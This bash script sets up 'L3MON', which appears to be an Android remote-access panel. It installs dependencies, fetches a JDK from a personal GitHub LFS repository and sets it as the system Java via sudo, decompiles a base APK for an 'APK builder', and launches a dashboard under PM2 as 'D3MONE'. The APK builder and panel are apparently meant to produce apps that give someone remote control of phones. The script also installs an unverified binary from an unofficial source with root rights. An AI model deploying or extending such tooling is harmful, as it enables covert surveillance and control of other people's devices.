#!/bin/bash

# L3MON One-Time Setup Script
# Developed for evrahimkhan

echo "🚀 Starting L3MON One-Time Setup..."

# 1. Update and Install Base Dependencies
echo "📦 Installing system dependencies..."
sudo apt update && sudo apt install -y wget curl git npm nodejs

# 2. Java 8 Check/Installation (download from github.com/evrahimkhan/java)
echo "☕ Checking Java 8..."
JAVA_HOME_DIR="/usr/lib/jvm/jdk1.8.0_202"
if java -version 2>&1 | grep -q "1.8.0"; then
    echo "✅ Java 8 is already active."
else
    echo "⚠️ Java 8 not detected. Downloading from GitHub..."
    mkdir -p /tmp/java-setup
    # Get temporary download URL from Git LFS batch API
    LFS_URL=$(curl -s -X POST https://github.com/evrahimkhan/java.git/info/lfs/objects/batch \
        -H "Content-Type: application/vnd.git-lfs+json" \
        -H "Accept: application/vnd.git-lfs+json" \
        -d '{"operation":"download","transfers":["basic"],"objects":[{"oid":"9a5c32411a6a06e22b69c495b7975034409fa1652d03aeb8eb5b6f59fd4594e0","size":194042837}]}' \
        | grep -o '"href":"[^"]*"' | head -1 | cut -d'"' -f4)
    if [ -n "$LFS_URL" ] && wget -q --show-progress -O /tmp/java-setup/jdk8.tar.gz "$LFS_URL"; then
        sudo mkdir -p "$JAVA_HOME_DIR"
        sudo tar -xzf /tmp/java-setup/jdk8.tar.gz -C /usr/lib/jvm/ --strip-components=0
        rm -f /tmp/java-setup/jdk8.tar.gz
        sudo update-alternatives --install /usr/bin/java java "$JAVA_HOME_DIR/bin/java" 100
        sudo update-alternatives --set java "$JAVA_HOME_DIR/bin/java"
        sudo update-alternatives --install /usr/bin/javac javac "$JAVA_HOME_DIR/bin/javac" 100
        sudo update-alternatives --set javac "$JAVA_HOME_DIR/bin/javac"
        export JAVA_HOME="$JAVA_HOME_DIR"
        export PATH="$JAVA_HOME_DIR/bin:$PATH"
        echo "✅ Java 8 installed to $JAVA_HOME_DIR"
    else
        echo "❌ Failed to download JDK 8. Please install Java 8 manually."
        echo "   Repo: https://github.com/evrahimkhan/java"
    fi
fi

# 3. Node.js Dependencies
echo "npm 🛠️ Installing Node.js dependencies..."
npm install
npm install socket.io@2.2.0 --save # Force correct version for this codebase

# 4. Decompile base.apk (required for APK builder - decompiled/ is gitignored)
echo "📦 Decompiling base.apk for APK builder..."
if [ -f "app/factory/base.apk" ] && [ -f "app/factory/apktool.jar" ]; then
    if [ ! -d "app/factory/decompiled/smali" ]; then
        "$JAVA_HOME_DIR/bin/java" -jar app/factory/apktool.jar d app/factory/base.apk -o app/factory/decompiled -f
        echo "✅ base.apk decompiled."
    else
        echo "✅ Decompiled directory already exists."
    fi
else
    echo "⚠️ base.apk or apktool.jar not found — APK builder will auto-decompile on first build."
fi

# 4. Apply EJS Syntax Fixes (Critical for newer EJS versions)
echo "🛠️ Patching EJS templates for compatibility..."
find assets/views -name "*.ejs" -exec sed -i "s|<% include \([^'\" ]*\) %>|<%- include('\1') %>|g" {} +
echo "✅ EJS templates patched."

# 5. Database Initialization
if [ ! -f "maindb.json" ]; then
    echo "🗄️ Initializing database..."
    cp maindb.json.back maindb.json
    echo "⚠️ maindb.json created from backup. Please update it with your MD5 password."
else
    echo "✅ maindb.json already exists."
fi

# 6. PM2 Setup
echo "🚀 Setting up PM2..."
sudo npm install pm2 -g
pm2 delete L3MON 2>/dev/null || true
pm2 delete index 2>/dev/null || true
pm2 start index.js --name D3MONE
pm2 save

echo "------------------------------------------------"
echo "✅ Setup Complete!"
echo "Dashboard: http://127.0.0.1:22533"
echo "Manage with: pm2 status, pm2 logs, pm2 stop D3MONE"
echo "------------------------------------------------"
